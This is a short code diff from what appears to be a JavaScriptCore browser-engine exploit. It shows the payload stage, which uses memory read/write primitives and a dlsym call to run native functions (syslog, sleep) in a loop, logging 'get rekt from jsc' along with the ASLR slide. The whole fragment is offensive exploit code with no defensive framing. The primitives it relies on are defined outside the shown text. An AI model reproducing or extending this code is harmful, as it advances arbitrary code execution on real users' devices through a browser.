@@ -49,7 +49,7 @@ function main() {
 
 	var dlsym_addy = read_u32(0x1a0000 + 24 + slid);
 	var shc_slide = read_u32(0x1a0000 + 20 + slid);
-	write_str(0x148000, "get rekt from jsc %d\0");
+	write_str(0x148000, "get rekt from jsc %d (slide=%x)\0");
 	write_str(0x149000, "syslog\0");
 	write_str(0x14a000, "sleep\0");
 //	while (true) {
@@ -59,7 +59,7 @@ function main() {
 
 	var i = 0;
 	while (true) {
-		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x28, 0x148000, i, 0x3);
+		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x28, 0x148000, i, slide);
 		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x14a000, 0, 0), 1, 0x1, 0x2, 0x3);
 		i++;
 //		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x148000, i, 0x2, 0x3);
